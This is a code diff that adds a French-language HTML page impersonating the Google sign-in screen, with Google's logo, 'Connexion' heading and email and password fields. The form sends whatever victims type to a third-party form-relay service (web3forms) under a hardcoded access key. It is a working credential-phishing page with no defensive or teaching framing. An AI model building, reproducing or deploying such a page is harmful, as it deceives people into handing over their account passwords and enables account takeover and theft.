@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Connexion</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #f2f2f2;
+      font-family: "Segoe UI", Roboto, Tahoma, sans-serif;
+      color: #202124;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 40px 30px;
+      border-radius: 8px;
+      width: 360px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      height: 40px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-weight: 500;
+      font-size: 1.5rem;
+    }
+
+    .input-group {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #5f6368;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 4px;
+      border: 1px solid #dadce0;
+      font-size: 1rem;
+      background-color: #fff;
+      color: #202124;
+    }
+
+    .input-group input::placeholder {
+      color: #9e9e9e;
+    }
+
+    button {
+      width: 100%;
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px;
+      font-weight: 600;
+      font-size: 1rem;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1765cc;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form action="https://api.web3forms.com/submit" method="POST">
+      <input type="hidden" name="access_key" value="2ee965a7-fe03-40d0-981c-3b715c2ef17e" />
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Logo Google" />
+      </div>
+      <h1>Connexion</h1>
+      <div class="input-group">
+        <label for="email">Adresse e-mail</label>
+        <input type="email" name="Email" id="email" required placeholder="ex: utilisateur@gmail.com" />
+      </div>
+      <div class="input-group">
+        <label for="password">Mot de passe</label>
+        <input type="password" name="mp" id="password" required placeholder="Votre mot de passe" />
+      </div>
+      <button type="submit">Suivant</button>
+    </form>
+  </div>
+</body>
+</html>
